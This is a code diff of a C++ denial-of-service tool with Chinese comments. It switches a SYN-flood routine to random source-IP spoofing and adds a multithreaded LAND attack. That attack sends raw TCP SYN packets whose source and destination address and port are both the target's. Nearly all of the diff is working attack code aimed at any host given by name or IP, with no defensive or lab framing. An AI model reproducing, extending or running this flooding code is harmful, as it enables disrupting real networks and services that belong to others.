@@ -1,4 +1,6 @@
 #include "syn_flood.h"
+#include "attack.h"
+
 /*
  * SYN Flood是一种广为人知的DoS（拒绝服务攻击）是DDoS（分布式拒绝服务攻击）的方式之一，
  * 这是一种利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式
@@ -113,6 +115,49 @@ init_header(struct stip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
     tcp->sum = 0;
     tcp->urp = 0;
 
+
+    //TCP伪头部
+    pseudoheader->zero = 0;
+    pseudoheader->protocol = IPPROTO_TCP;
+    pseudoheader->length = htons(sizeof(struct tcphdr));
+    pseudoheader->daddr = inet_addr(dst_ip);
+    srand((unsigned) time(NULL));
+
+}
+
+/* 发送SYN包函数
+ * 填写IP头部，TCP头部
+ * TCP伪头部仅用于校验和的计算
+
+ */
+void
+init_land_header(struct stip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
+{
+    int len = sizeof(struct stip) + sizeof(struct tcphdr);
+    // IP头部数据初始化
+    ip->hl = (4<<4 | sizeof(struct stip)/sizeof(unsigned int));
+    ip->tos = 0;
+    ip->total_len = htons(len);
+    ip->id = 1;
+    ip->frag_and_flags = 0x40;
+    ip->ttl = 255;
+    ip->proto = IPPROTO_TCP;
+    ip->checksum = 0;
+    ip->sourceIP = inet_addr(dst_ip);
+    ip->destIP =   inet_addr(dst_ip);
+
+    // TCP头部数据初始化
+    tcp->sport = htons(dst_port);
+    tcp->dport = htons(dst_port);
+    tcp->seq = htonl(0xF1C);//htonl( rand()%90000000 + 2345 );
+    tcp->ack = 0;
+    tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
+    tcp->flag = 0x02;
+    tcp->win = htons (2048);
+    tcp->sum = 0;
+    tcp->urp = 0;
+
+
     //TCP伪头部
     pseudoheader->zero = 0;
     pseudoheader->protocol = IPPROTO_TCP;
@@ -143,8 +188,8 @@ void *send_synflood(void *addr)//struct sockaddr_in
     /* 处于活动状态时持续发送SYN包 */
     while(alive)
     {
-//        ip.sourceIP = rand();
-        ip.sourceIP = 1234;
+        ip.sourceIP = rand();
+//        ip.sourceIP = 1234;
 
         //计算IP校验和
         bzero(buf, sizeof(buf));
@@ -171,11 +216,68 @@ void *send_synflood(void *addr)//struct sockaddr_in
             pthread_exit(0);//"fail");
         }
 //        emit attackResult("syn attack...");
+//        emit processAttackResult("syn attack...");
 
 //        sleep(1);
     }
 }
 
+
+/* 发送SYN包函数
+ * 填写IP头部，TCP头部
+ * TCP伪头部仅用于校验和的计算
+ */
+void *send_landattack(void *addr)//struct sockaddr_in
+{
+    char buf[100], sendbuf[100];
+    int len;
+    struct stip ip;			//IP头部
+    struct tcphdr tcp;		//TCP头部
+    struct pseudohdr pseudoheader;	//TCP伪头部
+
+
+    len = sizeof(struct stip) + sizeof(struct tcphdr);
+
+    /* 初始化头部信息 */
+    init_land_header(&ip, &tcp, &pseudoheader);
+
+    /* 处于活动状态时持续发送SYN包 */
+    while(alive)
+    {
+//        ip.sourceIP = rand();
+//        ip.sourceIP = 1234;
+
+        //计算IP校验和
+        bzero(buf, sizeof(buf));
+        memcpy(buf , &ip, sizeof(struct stip));
+        ip.checksum = checksum((u_short *) buf, sizeof(struct stip));
+
+        pseudoheader.saddr = ip.sourceIP;
+        pseudoheader.daddr = ip.sourceIP;
+
+        //计算TCP校验和
+        bzero(buf, sizeof(buf));
+        memcpy(buf , &pseudoheader, sizeof(pseudoheader));
+        memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
+        tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
+
+        bzero(sendbuf, sizeof(sendbuf));
+        memcpy(sendbuf, &ip, sizeof(struct stip));
+        memcpy(sendbuf+sizeof(struct stip), &tcp, sizeof(struct tcphdr));
+        printf(".");
+        if (
+            sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
+            < 0)
+        {
+            perror("sendto()");
+            pthread_exit(0);//"fail");
+        }
+//        emit attackResult("syn attack...");
+//        emit processAttackResult("syn attack...");
+
+//        sleep(1);
+    }
+}
 /* 信号处理函数,设置退出变量alive */
 void sig_int(int signo)//
 {
@@ -259,6 +361,99 @@ int syn_flood::do_main(char *strip,int port)
     for(i=0; i<MAXCHILD; i++)
     {
         err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
+        if(err != 0)
+        {
+            perror("pthread_create()");
+            exit(1);
+        }
+        //sleep(1);
+        //break;//test
+    }
+
+    /* 等待线程结束 */
+    for(i=0; i<MAXCHILD; i++)
+    {
+        err = pthread_join(pthread[i], NULL);
+        if(err != 0)
+        {
+            perror("pthread_join Error\n");
+            exit(1);
+        }
+    }
+
+    close(sockfd);
+
+    return 0;
+}
+
+
+/* 主函数 */
+int syn_flood::do_land(char *strip,int port)
+{
+    struct sockaddr_in addr;
+    struct hostent * host = NULL;
+
+    int on = 1;
+    int i = 0;
+    pthread_t pthread[MAXCHILD];
+    int err = -1;
+
+    alive = 1;
+    /* 截取信号CTRL+C */
+    signal(SIGINT, sig_int);
+
+    strncpy( dst_ip, strip, 16 );
+    dst_port = port;//atoi( argv[2] );
+
+    bzero(&addr, sizeof(addr));
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(dst_port);
+
+    if(inet_addr(dst_ip) == INADDR_NONE)
+    {
+        /* 为DNS地址，查询并转换成IP地址 */
+        host = gethostbyname(strip);
+        if(host == NULL)
+        {
+            perror("gethostbyname()");
+            exit(1);
+        }
+        addr.sin_addr = *((struct in_addr*)(host->h_addr));
+        strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
+    }
+    else
+        addr.sin_addr.s_addr = inet_addr(dst_ip);
+
+    if( dst_port < 0 || dst_port > 65535 )
+    {
+        printf("Port Error\n");
+        exit(1);
+    }
+
+    printf("host ip=%s\n", inet_ntoa(addr.sin_addr));
+
+    /* 建立原始socket */
+    sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sockfd < 0)
+    {
+        perror("socket()");
+        exit(1);
+    }
+    /* 设置IP选项 */
+    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
+    {
+        perror("setsockopt()");
+        exit(1);
+    }
+
+    /* 将程序的权限修改为普通用户 */
+//    setuid(getpid());
+
+    /* 建立多个线程协同工作 */
+    for(i=0; i<MAXCHILD; i++)
+    {
+        err = pthread_create(&pthread[i], NULL, send_landattack, &addr);
         if(err != 0)
         {
             perror("pthread_create()");
